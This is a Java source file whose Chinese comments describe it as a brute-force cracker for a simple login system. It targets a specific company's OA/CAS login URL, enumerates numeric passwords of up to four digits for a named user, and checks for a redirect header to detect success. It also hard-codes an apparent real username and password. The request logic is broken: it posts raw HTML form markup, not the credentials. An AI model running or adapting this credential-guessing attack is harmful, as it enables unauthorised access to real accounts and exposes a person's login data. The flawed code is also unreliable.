package com.nk.webmagic.pageProcessor;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
  
//暴力法破解简单登录系统：该系统无任何安全措施  
public class PostTest {  
    static String urlString = "http://oa.bjnk.com.cn:7009/cas-server/login?service=http://oa.bjnk.com.cn:7006/nkoa/login.html";  
  
    public PostTest() {  
    }  
  
    public PostTest(String urlString) {  
        this.urlString = urlString;  
    }  
  
    // 提交一次用户请求  
    public static boolean doPost(String user, String password) {  
        boolean sucess = false;  
        try {  
            URL realUrl = new URL(urlString);  
            HttpURLConnection conn = (HttpURLConnection) realUrl  
                    .openConnection();  
            conn.setDoOutput(true);  
            conn.setDoInput(true);  
            conn.setInstanceFollowRedirects(false);  
  
            // 提交表单,发送的数据是直接用Firebug截取的然后把用户名，密码部分换成参数  
            PrintWriter out = new PrintWriter(conn.getOutputStream());  
            out.print("<form onsubmit='onformSubmit()' method='post' action='/cas-server/login?service=http://oa.bjnk.com.cn:7006/nkoa/login.html' id='fm1'><input type='hidden' value='LT-85546-cMjvkYNe4fMOWc6SZ6rLu3JKDmEqrt-cas.bjnk.com.cn' name='lt'><input type='hidden' value='e1s1' name='execution'><input type='hidden' value='submit' name='_eventId'>			<input type='hidden' value='true' name='warn'>						<ul>                <li><label for='username'>用户名：</label><input type='text' value='zhangyuyang' maxlength='20' name='username' id='username' class='input'></li>                <li><label for='password'>密&nbsp;&nbsp;&nbsp;码：</label><input type='password' value='4321' maxlength='20' name='password' id='password' class='input'></li>                <li><label for='kaptcha'>验证码：</label><input type='text' maxlength='4' name='kaptcha' id='kaptcha' style='width: 26%' class='input'>                	<a class='captcha' onclick='changeit()' href='javascript:;'><img src='/cas-server/captcha' alt='captcha' id='captcha'></a>                </li>                <li>                	<label></label>                	<input type='submit' tabindex='4' value='登录' accesskey='l' name='submit' class='ui-button' id='btnLogin'>     				<a href='javaScript:document.getElementById('fm1').reset();' class='reset'>重置</a>                </li>                <li></li>            </ul>    	</form>    	    	");  
            out.flush();  
  
            // 如果登录不成功，报头中没有Location字段，getHeaderField("Location") 返回null  
            // 登录成功，返回一个随机的Location字段  
            // System.out.println(conn.getHeaderFields());  
            if (conn.getHeaderField("Location") != null) {  
                sucess = true;  
            }  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return sucess;  
    }  
  
    // 这是一个全排列算法, 对特定长度的密码排列组合，把结果存入list  
    // user:用户名 ， n:字符下标 ， len：字符数组长度,也就是密码长度  
    private boolean createPassWord(String user, char[] str, int n, int len) {  
        if (n == len) {  
            String ps = new String(str);  
            System.out.println(ps+"------");
            if (doPost(user, ps)) {  
              System.out.println("sucess:" + user + " : " + ps);  
                return true;  
            }  
            return false;  
        }  
        for (int i = 0; i <= 9; i++) {  
            str[n] = (char) (i + '0');  
            if (createPassWord(user, str, n + 1, len))  
                return true;  
        }  
        return false;  
    }  
  
    // 破解一个用户的密码  
    public void test(String user) {  
        for (int i = 0; i < 4; i++) {  
            if (createPassWord(user, new char[i + 1], 0, i + 1))  
                break;  
        }  
    }  
  
    public static void main(String[] args) {  
//        PostTest pt = new PostTest();  
//        pt.test("zhangyuyang");  
        if(doPost("zhangyuyang","4321")){
        	System.out.println("YES");
        }
//        for (int i = 1; i <= 9; i++)  
//        for (int i = 10; i <= 31; i++)  
//            pt.test("0905051" + i);  
    }  
}  